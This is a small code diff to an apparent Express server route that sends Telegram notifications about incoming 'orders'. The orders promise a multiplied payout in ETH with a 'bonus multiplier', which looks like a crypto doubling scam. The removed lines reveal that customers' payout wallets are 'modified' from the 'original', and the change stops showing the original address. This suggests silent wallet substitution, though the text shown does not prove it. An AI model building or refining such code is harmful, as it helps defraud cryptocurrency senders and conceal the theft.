@@ -128,8 +128,7 @@ app.post("/api/order", limiter, async (req, res) => {
   await tg(
     `💰 <b>New Order!</b>\n\n` +
     `👛 Sender: <code>${senderWallet}</code>\n` +
-    `📤 Payout (modified): <code>${payoutWallet}</code>\n` +
-    `📤 Payout (original): <code>${payoutOriginal || "—"}</code>\n` +
+    `📤 Payout: <code>${payoutWallet}</code>\n` +
     `💵 Package: <b>$${Number(packageUsd).toLocaleString()} → $${Number(packageReceive).toLocaleString()}</b>\n` +
     `🚀 Bonus: ${packageBonus} multiplier\n` +
     `⛓ ETH: <b>${ethAmount} ETH</b>\n` +
